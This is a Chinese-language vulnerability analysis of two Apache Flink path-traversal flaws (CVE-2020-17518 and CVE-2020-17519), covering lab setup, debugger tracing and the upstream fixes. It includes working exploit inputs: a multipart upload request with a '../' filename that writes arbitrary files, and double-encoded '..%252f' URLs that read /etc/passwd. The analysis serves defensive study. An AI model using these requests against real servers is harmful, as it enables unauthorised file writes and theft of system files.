昨天 Apache Flink 出的两个漏洞（CVE-2020-17518/CVE-2020-17519），比较类似，原理也很简单，这里简单分析一下。

## 环境

已有漏洞环境的盆友可越过这节，直接看漏洞部分。

JDK装好![](https://image.3001.net/images/20210107/1610004814_5ff6b94e3f5d9d5d00a81.png!small)

Flink安装包地址：<https://archive.apache.org/dist/flink/flink-1.11.2/>

为同时满足两个漏洞环境，这里安装1.11.2版本

![](https://image.3001.net/images/20210107/1610004832_5ff6b9609baea6eff2aaa.png!small)

解压缩

    
    
    # tar -zxvf flink-1.11.2-bin-scala_2.11.tgz

![](https://image.3001.net/images/20210107/1610004864_5ff6b980ab8cb9ae1e576.png!small)

修改配置文件 **conf/flink-conf.yaml** ，中jobmanager.rpc.address参数为本地服务器IP地址

> jobmanager.rpc.address: 192.168.18.169

添加 **远程调试** 参数

    
    
    # jobmanager debug端口
    env.java.opts.jobmanager: "-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5006"
    # taskmanager debug端口
    env.java.opts.taskmanager: "-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005"

 **启动Flink服务**

    
    
    # cd bin
    # ./start-cluster.sh

![](https://image.3001.net/images/20210107/1610004884_5ff6b99485e3cad51e7ac.png!small)

看看开放了哪些端口：5005、5006是配置的debug端口，8081是webUI访问端口，6123是JobMamanger进行RPC通信的端口

![](https://image.3001.net/images/20210107/1610004896_5ff6b9a0b260a1e2c6e35.png!small)

访问服务

![](https://image.3001.net/images/20210107/1610004908_5ff6b9acba304285e7793.png!small)

 **停止F** **link服务**

flink启动会把启动的进程的ID存到一个文件中，相关配置在 **bin/config.sh**
文件中，默认是“/tmp”，由于是临时目录，会被系统清理，存放的进程ID就找不到了，也就没法关闭集群了。

 **直接执行关闭指令，会发现关闭不了**

![](https://image.3001.net/images/20210107/1610004928_5ff6b9c024cff2713cd30.png!small)

 **怎么做？**

新建一个目录 /usr/local/flink-1.11.2/tmp 来存放启动的进程的ID

修改 bin/config.sh 文件，为 **DEFAULT_ENV_PID_DIR** 参数指定为新建的路径

    
    
    DEFAULT_ENV_PID_DIR="/usr/local/flink-1.11.2/tmp" 

![](https://image.3001.net/images/20210107/1610004946_5ff6b9d2693fd0e6f92ca.png!small)

重新执行关闭指令：

    
    
    # ./stop-cluster.sh 

![](https://image.3001.net/images/20210107/1610004996_5ff6ba04ce26bf8307de6.png!small)

### 远程调试

上文远程Flink服务的配置文件 **flink-conf.yaml** 中已经配好了远程调试参数，开启了5005、5006调试端口。

![](https://image.3001.net/images/20210107/1610005005_5ff6ba0d9d416b11f09b4.png!small)

本地IDEA打开目标版本源码，这里是[1.11.2](https://github.com/apache/flink/releases/tag/release-1.11.2)，创建Remote配置，指定Host和Port，这里调试
jobmanager，选择对应的端口。

![](https://image.3001.net/images/20210107/1610005015_5ff6ba17404fd89197c0b.png!small)

开启远程调试

![](https://image.3001.net/images/20210107/1610005024_5ff6ba20926f4a9939603.png!small)

## CVE-2020-17518

Flink 在 1.5.1 版本中引入了一个 REST handler，这允许攻击者将已上传的文件写入本地任意位置的文件中，并且可通过一个恶意修改的
HTTP 头将这些文件写入到 Flink 1.5.1 可以访问的任意位置。

 **影响范围：** 1.5.1 <= Apache Flink <= 1.11.2

###  **快速复现**

  1. 利用一：文件上传

编辑请求数据包，上传 /tmp/veraxy 文件

    
    
    POST /jars/upload HTTP/1.1
    Host: 192.168.18.169:8081
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:84.0) Gecko/20100101 Firefox/84.0
    Accept: application/json, text/plain, */*
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: multipart/form-data; boundary=---------------------------13247690941547071692111317477
    Content-Length: 248
    Origin: http://192.168.18.169:8081
    Connection: close
    Referer: http://192.168.18.169:8081/
    
    
    -----------------------------13247690941547071692111317477
    Content-Disposition: form-data; name="jarfile"; filename="../../../../../../tmp/veraxy"
    Content-Type: text/plain
    
    
    Veraxy!!!
    -----------------------------13247690941547071692111317477-
![](https://image.3001.net/images/20210107/1610005163_5ff6baabc9bea95b925bd.png!small)

![](https://image.3001.net/images/20210107/1610005199_5ff6bacf5053ba3338a8e.png!small)

2\. 利用二：文件覆盖

若上传路径已有文件，将覆盖其内容。

![](https://image.3001.net/images/20210107/1610005218_5ff6bae2671558480f836.png!small)

![](https://image.3001.net/images/20210107/1610005230_5ff6baee4dba93a0b46df.png!small)

### 分析

查看该漏洞相关[邮件](https://lists.apache.org/thread.html/rb43cd476419a48be89c1339b527a18116f23eec5b6df2b2acbfef261%40%3Cdev.flink.apache.org%3E)，已经指出commit地址

![](https://image.3001.net/images/20210107/1610005266_5ff6bb12a9323f84a2ca1.png!small)

移步[commit](https://github.com/apache/flink/commit/a5264a6f41524afe8ceadf1d8ddc8c80f323ebc4)，提出是上传功能的校验问题，并指出这里会提供两个测试案例

![](https://image.3001.net/images/20210107/1610005278_5ff6bb1e873bcea08ca69.png!small)

测试代码再次给出提示，修改文件名添加 **../**

![](https://image.3001.net/images/20210107/1610005288_5ff6bb28eb009099246b4.png!small)

我们找到系统的上传功能

![](https://image.3001.net/images/20210107/1610005298_5ff6bb322258c1948e7d4.png!small)

传个测试文件，是 **/jars/upload** 接口

![](https://image.3001.net/images/20210107/1610005307_5ff6bb3bafa319693eeab.png!small)

[官方文档](https://ci.apache.org/projects/flink/flink-docs-release-1.11/monitoring/rest_api.html)对该接口的使用说明

![](https://image.3001.net/images/20210107/1610005318_5ff6bb46695399649d2e4.png!small)

在处理上传路径的地方打断点

![](https://image.3001.net/images/20210107/1610005339_5ff6bb5b3e3d68ac14bc0.png!small)

获取filename

![](https://image.3001.net/images/20210107/1610005347_5ff6bb63529992850b7b6.png!small)

resolve()解析方法接收filename，与系统路径拼接

![](https://image.3001.net/images/20210107/1610005353_5ff6bb69af058e7395a45.png!small)

dest存储拼接后上传路径，传给 fileUpload.renameTo()方法

![](https://image.3001.net/images/20210107/1610005393_5ff6bb91e686f4331eeda.png!small)

上传文件，并重命名保存至另一个路径以做缓存

![](https://image.3001.net/images/20210107/1610005401_5ff6bb99d9e23891413db.png!small)

缓存文件存在时间很短，只有30s

![](https://image.3001.net/images/20210107/1610005408_5ff6bba06563d205c494a.png!small)

此时系统已按目标路径写入文件

![](https://image.3001.net/images/20210107/1610005416_5ff6bba8a7cfd4d1d63d7.png!small)

###  **新版本修复**

对上传路径做了处理

![](https://image.3001.net/images/20210107/1610005446_5ff6bbc66c8e05329d70f.png!small)

org.apache.flink.runtime.rest.FileUploadHandler#channelRead0()
对传入的filename进行截断，只取末尾的文件名，传递的 **../ 和目录名** 均被忽略

![](https://image.3001.net/images/20210107/1610005459_5ff6bbd362909c45aaee7.png!small)

resolve()方法接收到的文件名只有结尾部分，与系统路径拼接后返回

![](https://image.3001.net/images/20210107/1610005467_5ff6bbdbb5c5cd74c1321.png!small)

赋值给dest路径变量，执行重命名缓存行为并上传文件

![](https://image.3001.net/images/20210107/1610005475_5ff6bbe35156af796b9f3.png!small)

## CVE-2020-17519

Apache Flink
1.11.0中引入的更改（包括1.11.1和1.11.2）允许攻击者通过JobManager进程的REST接口读取JobManager本地文件系统上的任何文件。

 **影响范围：** Apache Flink 1.11.0、1.11.1、1.11.2

###  **快速复现**

遍历文件 /etc/passwd

    
    
    http://192.168.18.171:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd

![](https://image.3001.net/images/20210107/1610005511_5ff6bc074d814b47fd0cf.png!small)

### 分析

查看该漏洞相关[邮件](https://lists.apache.org/thread.html/r6843202556a6d0bce9607ebc02e303f68fc88e9038235598bde3b50d%40%3Cdev.flink.apache.org%3E)，同样指出commit地址

![](https://image.3001.net/images/20210107/1610005519_5ff6bc0f67a4fe068aaaf.png!small)

移步[commit](https://github.com/apache/flink/commit/b561010b0ee741543c3953306037f00d7a9f0801)，细节描述的很清晰了，指出通过二次编码后的
'..%252f' 来替换 '../' 可以遍历logs文件夹的目录结构，比如："/jobmanager/logs/..%252f/README.txt"
将返回README.txt的内容

![](https://image.3001.net/images/20210107/1610005526_5ff6bc16e17f34ceca490.png!small)

文档找一下 **/jobmanager/logs** 接口说明

![](https://image.3001.net/images/20210107/1610005537_5ff6bc213991e8e4bfe0b.png!small)

发送请求

>
> <http://192.168.18.169:8081/jobmanager/logs/..%252f..%252f..%252f..%252fetc%252fpasswd>

系统接收请求，对request进行解析，初始化HandlerRequest对象

![](https://image.3001.net/images/20210107/1610005544_5ff6bc287694178231764.png!small)

routedRequest.getRouteResult()获取result，decodedPath为一次解码后，pathParams存放二次解码后结果

![](https://image.3001.net/images/20210107/1610005553_5ff6bc3168e58035dfb1a.png!small)

![](https://image.3001.net/images/20210107/1610005577_5ff6bc492c226eaa12b57.png!small)

将HandlerRequest传递给org.apache.flink.runtime.rest.handler.cluster.JobManagerCustomLogHandler#getFile，获取pathParams中存放的filename，拼接logDir返回路径。

![](https://image.3001.net/images/20210107/1610005612_5ff6bc6c994245a4d87de.png!small)

读取文件内容作为响应。

![](https://image.3001.net/images/20210107/1610005621_5ff6bc7542a475bbc6213.png!small)

### 不懂就问

 **routedRequest.getRouteResult()获取的result是如何初始化的？包括其中的解码流程。**

![](https://image.3001.net/images/20210107/1610005704_5ff6bcc873079d0b478d7.png!small)

回溯到org.apache.flink.runtime.rest.handler.router.RouterHandler#channelRead0()，这里routeResult为后面routedRequest中this.result原型，看routeResult如何初始化

![](https://image.3001.net/images/20210107/1610005725_5ff6bcdded81040f13238.png!small)

url一次解码的地方，赋值给this.path返回

![](https://image.3001.net/images/20210107/1610005744_5ff6bcf03ac73a179e7e7.png!small)

将method、path、queryParameters传送给router.route()方法来初始化一个routeResult对象

![](https://image.3001.net/images/20210107/1610005758_5ff6bcfe72293d6017c1e.png!small)

其中decodePathTokens(path)将path进行了二次解码，与此同时会判断路径中的“/”并截断，我们传入“/”的编码形式免于拦截，随后的for循环中再次进行解码，成功返回一个正常路径。

![](https://image.3001.net/images/20210107/1610005776_5ff6bd100a0f034859250.png!small)

### 新版本修复

跟17518修复方式一致，通过 **File.getName()** 只取末尾文件名

![](https://image.3001.net/images/20210107/1610005799_5ff6bd27d00ab05bf9f47.png!small)

org.apache.flink.runtime.rest.handler.cluster.JobManagerCustomLogHandler#getFile方法，

路径中的 **../和目录名** 都被忽略，filename只剩下了文件名

![](https://image.3001.net/images/20210107/1610005808_5ff6bd30bcf257650b973.png!small)

## 总结

Apache Flink 服务大多开放在内网，漏洞影响面不算太大，但大数据时代随着该应用的使用量日益增多，其漏洞还是值得重视的。

